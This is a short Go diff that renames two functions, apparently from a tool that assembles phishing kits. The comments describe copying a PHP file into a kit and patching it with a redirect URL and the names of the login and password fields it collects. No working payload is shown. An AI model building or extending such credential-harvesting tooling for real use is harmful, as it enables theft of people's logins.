@@ -5,8 +5,8 @@ import (
 	"io/ioutil"
 )
 
-// CopyPhpToKit (phpfilename string, destFolder string): copy PHP file in destFolder
-func CopyPhpToKit(phpfilename string, destFolder string) error {
+// copyPhpToKit (phpfilename string, destFolder string): copy PHP file in destFolder
+func copyPhpToKit(phpfilename string, destFolder string) error {
 
 	// check if PHP file exists
 	phpfile, err := ioutil.ReadFile(phpfilename)
@@ -22,8 +22,8 @@ func CopyPhpToKit(phpfilename string, destFolder string) error {
 	return nil
 }
 
-//  PatchPhp (phppath string, postLogin string, postPassword string urlin string): patch PHP with url redirection and correct names of attributes for credentials
-func PatchPhp(phppath string, postLogin string, postPassword string, urlin string) error {
+// patchPhp (phppath string, postLogin string, postPassword string urlin string): patch PHP with url redirection and correct names of attributes for credentials
+func patchPhp(phppath string, postLogin string, postPassword string, urlin string) error {
 
 	// open new php file
 	read, err := ioutil.ReadFile(phppath)
